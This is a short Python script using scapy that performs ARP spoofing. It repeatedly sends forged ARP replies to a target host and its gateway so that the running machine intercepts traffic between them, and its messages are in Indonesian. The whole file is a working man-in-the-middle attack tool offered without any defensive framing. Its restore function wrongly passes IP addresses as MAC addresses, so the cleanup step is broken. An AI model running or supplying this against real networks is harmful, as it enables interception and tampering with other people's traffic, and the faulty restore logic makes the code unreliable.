import scapy.all as scapy
import time
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP.")
    parser.add_option("-m", "--mac", dest="mac", help="Mac.")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway.")
    options, arguments = parser.parse_args()
    if not options.target:
        parser.error("IP target belum dimasukkan")
    if not options.mac:
        parser.error("mac belum dimasukkan")
    if not options.gateway:
        parser.error("IP gateway belum dimasukkan")
    return options


options = get_arguments()
def spoof(target_ip, spoof_ip):
    # target_mac = get_mac(target_ip)
    # target_mac = "cc:2d:83:a0:3b:92"
    target_mac = options.mac
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = destination_ip
    source_mac = source_ip
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

counter = 0;

ipTarget = options.target
ipGateway =options.gateway
try:
    while True:
        spoof(ipTarget, ipGateway)
        spoof(ipGateway, ipTarget)
        counter+=2;
        print("\rpackage sent " + str(counter), end="")
        # print("\rpackage sent " + str(counter))
        time.sleep(2)

except KeyboardInterrupt:
    print("\n Ctrl + C terdeteksi sistem keluar");
    restore(ipTarget, ipGateway)
    restore(ipGateway, ipTarget)
